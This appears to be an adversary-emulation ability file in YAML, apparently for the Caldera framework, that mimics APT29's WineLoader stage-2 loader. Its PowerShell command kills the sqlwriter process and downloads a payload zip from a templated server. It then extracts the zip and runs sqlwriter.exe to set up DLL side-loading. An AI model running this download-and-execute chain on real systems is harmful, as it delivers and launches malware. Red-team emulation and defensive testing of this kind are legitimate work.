- id: wineloader-stage2-core
  name: WineLoader Stage 2 â€“ Core Loader
  description: Payload extraction and DLL side-loading
  tactic: execution
  technique_id:
  - T1574.002   
  - T1140      
  - T1041       
  technique_name: "DLL Side-Loading"
  platforms:
    windows:
      psh:
        command: |
          $ErrorActionPreference = "Stop";
          $workDir = "C:\Users\Public\Music\Work";
          $zipPath = "$workDir\data.zip";
          try {
              Write-Host "[*] Start Stage 2 execution";
              $oldProc = Get-Process -Name "sqlwriter" -ErrorAction SilentlyContinue;
              if ($oldProc) {
                  Write-Host "[!] Found running sqlwriter.exe. Terminating...";
                  Stop-Process -Name "sqlwriter" -Force;
                  Start-Sleep -Seconds 1;
              };
              if (-not (Test-Path $workDir)) {
                  New-Item -ItemType Directory -Path $workDir -Force | Out-Null;
                  Write-Host "[+] Created working directory: $workDir";
              } else {
                  Write-Host "[*] Working directory already exists: $workDir";
              };
              Write-Host "[*] Downloading payload.zip...";
              $headers = @{"file"="payload.zip"};
              Invoke-WebRequest -Uri "#{server}/file/download" -Headers $headers -OutFile $zipPath -UseBasicParsing;
              if (-not (Test-Path $zipPath)) { throw "Payload download failed" };
              Write-Host "[+] Zip downloaded: $zipPath";
              Write-Host "[*] Extracting payload...";
              Expand-Archive -Path $zipPath -DestinationPath $workDir -Force;
              Write-Host "[+] Unzipped to: $workDir";
              Write-Host "[*] Directory content:";
              Get-ChildItem -Path $workDir | Select-Object Name | Out-String | Write-Host;
              $exePath = "$workDir\sqlwriter.exe";
              if (Test-Path $exePath) {
                  Set-Location $workDir;
                  Write-Host "[+] Running: $exePath";
                  $p = Start-Process ".\sqlwriter.exe" -PassThru;
                  if ($p) {
                      Write-Host "[+] Process started. PID: $($p.Id)";
                      Start-Sleep -Seconds 2;
                      if ($p.HasExited) {
                          Write-Host "[!] Process exited quickly. Code: $($p.ExitCode)";
                      };
                  };
                  eventcreate /T INFORMATION /ID 999 /L APPLICATION /SO "WineLoader" /D "WineLoader Stage2 executed" | Out-Null;
                  Write-Host "[+] Event log entry created";
                  Write-Output "stage2_executed";
              } else {
                  throw "sqlwriter.exe not found in $workDir after extraction";
              };
          } catch {
              Write-Host "[!] Error encountered:";
              Write-Error "Error: $($_.Exception.Message)";
              exit 1;
          }
        parsers:
          plugins.stockpile.app.parsers.line:
            - source: apt29.wineloader.status